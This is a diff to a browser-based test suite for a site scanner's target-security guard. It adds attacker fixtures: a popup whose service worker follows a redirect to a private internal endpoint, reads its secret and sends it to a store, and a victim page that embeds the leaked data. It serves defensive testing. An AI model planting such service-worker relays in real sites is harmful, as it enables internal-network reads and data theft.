@@ -92,6 +92,14 @@ describe('Scan target security (real browser)', () => {
    * `127.0.0.1` is on the host allowlist.
    */
   let internal: FixtureSiteServer;
+  /**
+   * A second allowed origin (127.0.0.1, another port) run by the attacker:
+   * a popup page with a service worker, and a store that relays what the
+   * worker read to the scanned page.
+   */
+  let relay: FixtureSiteServer;
+  /** What the relay's service worker stored. */
+  let relayed = '';
   let dataSource: DataSource;
   let scanRepository: Repository<Scan>;
   let issueRepository: Repository<Issue>;
@@ -107,6 +115,7 @@ describe('Scan target security (real browser)', () => {
   const siteUrl = (path: string): string => `${site.baseUrl}${path}`;
   const internalUrl = (path: string): string =>
     `http://localhost:${internal.port}${path}`;
+  const relayUrl = (path: string): string => `${relay.baseUrl}${path}`;
   /** The site under its loopback name instead of its address. */
   const loopbackNameUrl = (path: string): string =>
     `http://localhost:${site.port}${path}`;
@@ -180,6 +189,11 @@ describe('Scan target security (real browser)', () => {
     internal = await startFixtureSiteServer(fixtureRoot, {
       routes: {
         '/secret': (_req, res) => violatingPage(res, 200, 'Internal secret'),
+        // A private service that lets any origin read it.
+        '/secret-cors': (_req, res) => {
+          res.setHeader('access-control-allow-origin', '*');
+          res.end('TOPSECRET');
+        },
         '/frame': (_req, res) => violatingPage(res, 200, 'Internal frame'),
         // Another origin asking for Basic credentials (a subresource / a
         // redirect target). Chromium only lets same-site subresources and
@@ -202,6 +216,40 @@ describe('Scan target security (real browser)', () => {
           res.setHeader('content-type', 'application/javascript');
           res.end("document.title = 'Internal script ran';");
         },
+      },
+    });
+    relay = await startFixtureSiteServer(fixtureRoot, {
+      routes: {
+        '/popup.html': htmlPage(
+          'Popup',
+          "<script>navigator.serviceWorker.register('/relay-sw.js');</script>",
+        ),
+        // Reads a private response through a redirect and stores it here.
+        '/relay-sw.js': (_req, res) => {
+          res.setHeader('content-type', 'application/javascript');
+          res.end(
+            "self.addEventListener('install', (event) => { event.waitUntil((async () => {" +
+              " const read = await (await fetch('/r/to-internal')).text();" +
+              " await fetch('/store?d=' + encodeURIComponent(read)); })().catch(() => {}));" +
+              ' self.skipWaiting(); });',
+          );
+        },
+        '/r/to-internal': redirectTo(() => internalUrl('/secret-cors')),
+        '/store': (req, res) => {
+          relayed =
+            new URL(req.url ?? '/', 'http://relay').searchParams.get('d') ?? '';
+          res.end('ok');
+        },
+        '/load': (_req, res) => {
+          res.setHeader('access-control-allow-origin', '*');
+          res.end(relayed);
+        },
+        // A popup whose own image redirects to a private address.
+        '/popup-with-blocked-hop.html': htmlPage(
+          'Popup with a blocked image',
+          '<img alt="" src="/r/image-to-internal">',
+        ),
+        '/r/image-to-internal': redirectTo(() => internalUrl('/frame')),
       },
     });
     site = await startFixtureSiteServer(fixtureRoot, {
@@ -335,6 +383,50 @@ describe('Scan target security (real browser)', () => {
               ' self.skipWaiting(); });',
           );
         },
+        // Opens a popup on the relay origin, then shows what the relay
+        // stored. It never loads the relay's origin itself.
+        '/relay-victim': (req, res) =>
+          htmlPage(
+            'Relay victim',
+            `<script>
+              window.open('${relayUrl('/popup.html')}');
+              (async () => {
+                for (let i = 0; i < 100; i++) {
+                  const data = await (await fetch('${relayUrl('/load')}')).text();
+                  if (data) {
+                    document.querySelector('main').insertAdjacentHTML(
+                      'beforeend', '<img src="/pixel.png" data-leak="' + data + '">');
+                    return;
+                  }
+                  await new Promise((resolve) => setTimeout(resolve, 50));
+                }
+              })();
+            </script><script src="/after-relay.js"></script>`,
+          )(req, res),
+        // Holds back DOMContentLoaded until the relay stored what it read
+        // (at most ten seconds), so the scan sees the relay happen.
+        '/after-relay.js': (_req, res) => {
+          const started = Date.now();
+          const poll = setInterval(() => {
+            if (!relayed && Date.now() - started < 10_000) return;
+            clearInterval(poll);
+            res.setHeader('content-type', 'application/javascript');
+            res.end('void 0;');
+          }, 20);
+        },
+        '/opens-popup-with-blocked-hop': (req, res) =>
+          htmlPage(
+            'Opens a popup',
+            `<script>window.open('${relayUrl('/popup-with-blocked-hop.html')}');</script>` +
+              '<script src="/slower.js"></script>',
+          )(req, res),
+        // Holds back DOMContentLoaded long enough for a popup to load.
+        '/slower.js': (_req, res) => {
+          setTimeout(() => {
+            res.setHeader('content-type', 'application/javascript');
+            res.end('void 0;');
+          }, 3000);
+        },
         '/sw.js': (_req, res) => {
           res.setHeader('content-type', 'application/javascript');
           res.end(
@@ -363,6 +455,7 @@ describe('Scan target security (real browser)', () => {
     await dataSource.destroy();
     await site.close();
     await internal.close();
+    await relay.close();
   });
 
   beforeEach(async () => {
@@ -370,6 +463,7 @@ describe('Scan target security (real browser)', () => {
     await scanRepository.clear();
     site.requests.length = 0;
     internal.requests.length = 0;
+    relayed = '';
     // A requested AI audit makes evidence collection observable: it must
     // never see a page whose content is rejected.
     agentAudit = {
@@ -603,15 +697,15 @@ describe('Scan target security (real browser)', () => {
       }
     });
 
-    it("rejects only the pages on a service worker's origin when its redirect hop is blocked", async () => {
+    it('rejects every open page when a service worker hop is blocked', async () => {
       const { scanner } = buildProcessor(guarded);
       const context = await scanner.createContext(
         await browserService.getBrowser(),
       );
       try {
-        // A page of another allowed origin: the internal server by address.
+        // A page of another allowed origin, which never loads the worker's.
         const bystander = await context.newPage();
-        await bystander.goto(`http://127.0.0.1:${internal.port}/frame`);
+        await bystander.goto(relayUrl('/index.html'));
         const client = await context.newPage();
         await client.goto(siteUrl('/index.html'));
 
@@ -624,19 +718,58 @@ describe('Scan target security (real browser)', () => {
             ),
           )
           .catch(() => undefined);
-        for (let waited = 0; !client.isClosed() && waited < 5000; ) {
+        for (let waited = 0; !bystander.isClosed() && waited < 5000; ) {
           await new Promise((resolve) => setTimeout(resolve, 50));
           waited += 50;
         }
-        await new Promise((resolve) => setTimeout(resolve, 200));
 
         await expect(scanner.assertPageAllowed(client)).rejects.toThrow(
           internalUrl('/secret'),
         );
-        expect(bystander.isClosed()).toBe(false);
-        await expect(
-          scanner.assertPageAllowed(bystander),
-        ).resolves.toBeUndefined();
+        await expect(scanner.assertPageAllowed(bystander)).rejects.toThrow(
+          internalUrl('/secret'),
+        );
+      } finally {
+        await context.close();
+      }
+    });
+
+    it("rejects a page that a popup's service worker relays a blocked response to", async () => {
+      const { scanner } = buildProcessor(guarded);
+      const context = await scanner.createContext(
+        await browserService.getBrowser(),
+      );
+      try {
+        const page = await context.newPage();
+
+        const scan = scanner.scanPage(page, siteUrl('/relay-victim'));
+
+        await expect(scan).rejects.toThrow(TargetPolicyViolationError);
+        await expect(scan).rejects.toThrow(internalUrl('/secret-cors'));
+        // The relay worked; the scanner kept nothing of it.
+        expect(
+          internal.requests.some((request) => request.url === '/secret-cors'),
+        ).toBe(true);
+      } finally {
+        await context.close();
+      }
+    });
+
+    it('rejects the page that opened a popup whose redirect hop is blocked', async () => {
+      const { scanner } = buildProcessor(guarded);
+      const context = await scanner.createContext(
+        await browserService.getBrowser(),
+      );
+      try {
+        const page = await context.newPage();
+
+        const scan = scanner.scanPage(
+          page,
+          siteUrl('/opens-popup-with-blocked-hop'),
+        );
+
+        await expect(scan).rejects.toThrow(/popup it opened was rejected/);
+        await expect(scan).rejects.toThrow(internalUrl('/frame'));
       } finally {
         await context.close();
       }
